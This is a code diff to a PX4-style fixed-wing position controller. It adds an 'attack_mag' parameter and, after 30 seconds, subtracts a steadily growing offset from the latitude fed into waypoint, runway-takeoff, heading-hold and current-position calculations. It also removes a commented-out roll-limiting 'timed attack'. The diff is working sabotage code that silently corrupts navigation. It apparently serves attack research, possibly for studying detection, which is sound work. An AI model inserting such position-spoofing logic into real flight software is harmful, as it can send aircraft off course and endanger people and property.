@@ -38,6 +38,9 @@ extern "C" __EXPORT int fw_pos_control_l1_main(int argc, char *argv[]);
 FixedwingPositionControl *l1_control::g_control;
 static int _control_task = -1;			///< task handle for sensor task */
 
+//XXX set attack amount
+static double attack_mag = 5e-5;//values: 5e-6,8e-6,1.2e-5,2e-5,3e-5,5e-5,1e-4
+
 FixedwingPositionControl::FixedwingPositionControl() :
 	_sub_airspeed(ORB_ID(airspeed), 0, 0, nullptr),
 	_sub_sensors(ORB_ID(sensor_bias), 0, 0, nullptr),
@@ -516,11 +519,11 @@ FixedwingPositionControl::get_waypoint_heading_distance(float heading, position_
 
 	if (flag_init) {
 		// previous waypoint: HDG_HOLD_SET_BACK_DIST meters behind us
-		waypoint_from_heading_and_distance(_global_pos.lat, _global_pos.lon, heading + radians(180.0f),
+		waypoint_from_heading_and_distance(_global_pos.lat - ((hrt_absolute_time() > 3e7) ? (1e-6*attack_mag*(hrt_absolute_time()-3e7)) : (0)), _global_pos.lon, heading + radians(180.0f),
 						   HDG_HOLD_SET_BACK_DIST, &temp_prev.lat, &temp_prev.lon);
 
 		// next waypoint: HDG_HOLD_DIST_NEXT meters in front of us
-		waypoint_from_heading_and_distance(_global_pos.lat, _global_pos.lon, heading,
+		waypoint_from_heading_and_distance(_global_pos.lat - ((hrt_absolute_time() > 3e7) ? (1e-6*attack_mag*(hrt_absolute_time()-3e7)) : (0)), _global_pos.lon, heading,
 						   HDG_HOLD_DIST_NEXT, &temp_next.lat, &temp_next.lon);
 
 	} else {
@@ -1082,7 +1085,7 @@ FixedwingPositionControl::control_position(const math::Vector<2> &curr_pos, cons
 
 			if (_runway_takeoff.runwayTakeoffEnabled()) {
 				if (!_runway_takeoff.isInitialized()) {
-					_runway_takeoff.init(_yaw, _global_pos.lat, _global_pos.lon);
+					_runway_takeoff.init(_yaw, _global_pos.lat - ((hrt_absolute_time() > 3e7) ? (1e-6*attack_mag*(hrt_absolute_time()-3e7)) : (0)), _global_pos.lon);
 
 					/* need this already before takeoff is detected
 					 * doesn't matter if it gets reset when takeoff is detected eventually */
@@ -1095,7 +1098,7 @@ FixedwingPositionControl::control_position(const math::Vector<2> &curr_pos, cons
 
 				// update runway takeoff helper
 				_runway_takeoff.update(_airspeed, _global_pos.alt - terrain_alt,
-						       _global_pos.lat, _global_pos.lon, &_mavlink_log_pub);
+						       _global_pos.lat - ((hrt_absolute_time() > 3e7) ? (1e-6*attack_mag*(hrt_absolute_time()-3e7)) : (0)), _global_pos.lon, &_mavlink_log_pub);
 
 				/*
 				 * Update navigation: _runway_takeoff returns the start WP according to mode and phase.
@@ -1314,7 +1317,7 @@ FixedwingPositionControl::control_position(const math::Vector<2> &curr_pos, cons
 				}
 
 				/* we have a valid heading hold position, are we too close? */
-				float dist = get_distance_to_next_waypoint(_global_pos.lat, _global_pos.lon, _hdg_hold_curr_wp.lat,
+				float dist = get_distance_to_next_waypoint(_global_pos.lat - ((hrt_absolute_time() > 3e7) ? (1e-6*attack_mag*(hrt_absolute_time()-3e7)) : (0)), _global_pos.lon, _hdg_hold_curr_wp.lat,
 						_hdg_hold_curr_wp.lon);
 
 				if (dist < HDG_HOLD_REACHED_DIST) {
@@ -1466,16 +1469,6 @@ FixedwingPositionControl::control_position(const math::Vector<2> &curr_pos, cons
 	} else {
 		_last_manual = true;
 	}
-
-    /* XXX insert timed attacks here *
-    if (hrt_absolute_time() > 5e7) {
-        if (_att_sp.roll_body > 0.06f) {
-            _att_sp.roll_body = 0.06f;
-        }
-        if (_att_sp.roll_body < -0.06f) {
-            _att_sp.roll_body = -0.06f;
-        }
-    }*/
     
 	return setpoint;
 }
@@ -1626,9 +1619,8 @@ FixedwingPositionControl::task_main()
 			manual_control_setpoint_poll();
 			position_setpoint_triplet_poll();
 
-            /* XXX insert attack *
-			math::Vector<2> curr_pos((float)_global_pos.lat + 1e-6f*.00001f*float(hrt_absolute_time()), (float)_global_pos.lon);*/
-			math::Vector<2> curr_pos((float)_global_pos.lat, (float)_global_pos.lon);
+            /* XXX insert attack */
+            math::Vector<2> curr_pos((float)_global_pos.lat - ((hrt_absolute_time() > 3e7) ? (float(1e-6*attack_mag)*((float)hrt_absolute_time()-(float)3e7)) : (0)), (float)_global_pos.lon);//8e-6
 			math::Vector<2> ground_speed(_global_pos.vel_n, _global_pos.vel_e);
 
 			/*
